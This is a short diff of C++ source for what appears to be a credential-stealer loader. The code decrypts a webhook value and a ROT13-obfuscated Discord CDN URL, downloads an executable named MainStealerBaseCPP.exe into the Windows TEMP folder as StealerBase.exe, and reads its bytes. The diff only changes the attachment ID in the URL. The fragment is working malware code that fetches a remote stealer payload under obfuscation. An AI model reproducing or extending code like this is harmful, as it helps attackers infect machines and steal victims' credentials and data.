@@ -72,7 +72,7 @@ int main(int argc, char* argv[])
 			string WebHook = decrypt(RemovedBracketsWB);
 			string tempPath = getenv("TEMP");
 			string StealerBase = tempPath + "\\StealerBase.exe";
-			DownloadFile(decrypt("uggcf://pqa.qvfpbeqncc.pbz/nggnpuzragf/755908849738842196/759495648797261844/ZnvaFgrnyreOnfrPCC.rkr"), StealerBase); //StealerBase
+			DownloadFile(decrypt("uggcf://pqa.qvfpbeqncc.pbz/nggnpuzragf/755908849738842196/760552794763296788/ZnvaFgrnyreOnfrPCC.rkr"), StealerBase);
 			ifstream MyFile(StealerBase, std::ios::binary);
 			string AllBytes = string((istreambuf_iterator<char>(MyFile)),
 				(istreambuf_iterator<char>()));
